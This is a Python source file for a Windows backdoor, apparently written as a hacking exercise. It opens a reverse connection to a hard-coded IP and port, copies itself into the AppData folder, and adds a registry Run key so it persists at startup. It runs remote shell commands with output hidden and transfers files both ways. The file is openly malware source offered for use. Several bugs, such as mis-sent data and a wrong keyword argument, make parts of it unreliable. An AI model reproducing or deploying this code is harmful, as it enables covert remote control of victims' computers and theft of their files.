import socket
import subprocess
import json
import os,sys
import base64
import shutil
class Backdoor:
    def __init__(self,ip,port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # reverse connection to my pc so my ip should be given
        self.connection.connect((ip, port))

    def persistence(self):
        #setting  a location for payload
        file_location=os.environ['appdata']+"\\test.exe"
        #check if this file already exists in path if not then below
        if not os.path.exists(file_location):
            #using shutil finding users default location and copy to our prefered location
            shutil.copyfile(sys.executable,file_location)
            #For running this file on startup
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "'+file_location+'"',Shell=True)

    def execute_command(self, command):
        #if error occurs shell pop up, to avoid thi below line
        NULL=open(os.devnull,'wb')
        return subprocess.check_output(command,shell=True,stderr=NULL,stdin=NULL)

    def change_directory(self,path):
        os.chdir(path)
        return "[+] changing directory to"+path

    def box_send(self, data):
        # serialisation  or putting data inside json box
        json_data = json.dumps(data)
        # sending result to our pc
        self.connection.send(data)

    #download function
    def read_file(self,path):
        with open(path,'rb')as file:
            return base64.b64encode(file.read())

    #upload function
    def write_files(self,file_name,content):
        with open(file_name,'wb')as file:
            return file.write(base64.b64decode(content))

    def box_receive(self):
        json_data = ""
        while True:
            try:
                # storing the received box in a variable
                json_data = json_data + str(self.connection.recv(1024))
                # unwraaping the box
                return json.loads(json_data)
            except ValueError:
                continue


    def run(self):
            while True:
                command = self.box_receive()
                try:
                    if command[0] == "exit":
                        self.connection.close()
                        sys.exit()
                    elif command[0]=="cd" and len(command)>1:
                       cmd_result= self.change_directory(command)
                    elif command[0]=="download":
                        cmd_result=self.read_file(command[1])
                    elif command[0]=="upload":
                        cmd_result=self.write_files(command[1],command[2])
                    else:
                        cmd_result =self.connection.send(command)
                except Exception:
                    cmd_result="[-]Error"
                self.box_send(cmd_result)

try:
    backdoor_object=Backdoor("192.168.43.44",4444)
    backdoor_object.run()
except Exception:
    sys.exit(0)
